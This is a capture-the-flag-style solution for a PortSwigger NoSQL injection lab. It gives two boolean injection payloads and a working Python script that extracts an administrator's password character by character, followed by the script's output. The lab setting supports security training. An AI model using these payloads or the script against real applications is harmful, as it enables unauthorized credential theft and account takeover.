# Lab

https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data

## Solution

Payloads utilisés :

- `' && this.password[{}] != null || 'a'=='b` : permet de vérifier si le caractère à la position {} est présent dans le mot de passe, ce qui nous permet d'extraire la longueur du mot de passe
- `' && this.password[{}] == {} || 'a'=='b` : permet de vérifier si le caractère à la position {} est égal au caractère {} passé en paramètre, ce qui nous permet d'extraire le mot de passe caractère par caractère
 
```python
import requests

LAB_URL = "https://0ac8003403534e9a82875455001c004a.web-security-academy.net"
LAB_USER_LOOKUP_PATH = "/user/lookup?user="
DICTIONARY = "abcdefghijklmnopqrstuvwxyz"
USER_AIMED = "administrator"
PAYLOADS = {
    "RETREIVE_LENGTH": "'+%26%26+this.password[{}]+!%3d+null+||+'a'%3d%3d'b",  # ' && this.password[{}] != null || 'a'=='b
    "RETREIVE_PASSWORD": "'+%26%26+this.password[{}]+%3d%3d+'{}'+||+'a'%3d%3d'b" # ' && this.password[{}] == {} || 'a'=='b
}

SESSION_COOKIE = "C1QllF2KaapATR2h30pT5J4EqyMUEjoz"

def check_session_cookie():
    cookies = {"session": SESSION_COOKIE }
    r = requests.get(LAB_URL + LAB_USER_LOOKUP_PATH + USER_AIMED, cookies=cookies)
    if "Unauthorized" in r.text:
        print("Session cookie is not valid, please update it")
        exit(1)
    else:
        print("Session cookie is valid, starting script")

def extract_password_length(max_length=100):
    for i in range(1, 100):
        payload = PAYLOADS["RETREIVE_LENGTH"].format(i)
        cookies = {"session": SESSION_COOKIE }
        r = requests.get(LAB_URL + LAB_USER_LOOKUP_PATH + USER_AIMED + payload, cookies=cookies)
        if USER_AIMED not in r.text:
            return i
        
def extract_password():
    check_session_cookie()
    password = ""
    length = extract_password_length()
    for i in range(length):
        for c in DICTIONARY:
            payload = PAYLOADS["RETREIVE_PASSWORD"].format(i, c)
            cookies = {"session": SESSION_COOKIE }
            r = requests.get(LAB_URL + LAB_USER_LOOKUP_PATH + USER_AIMED + payload, cookies=cookies)
            if USER_AIMED in r.text:
                print("Found character: {} at position {}".format(c, i))
                password += c
                break
    return password

if __name__ == "__main__":
    print(extract_password())
```

```
Session cookie is valid, starting script
Found character: x at position 0
Found character: x at position 1
Found character: j at position 2
Found character: h at position 3
Found character: f at position 4
Found character: v at position 5
Found character: p at position 6
Found character: k at position 7
xxjhfvpk
```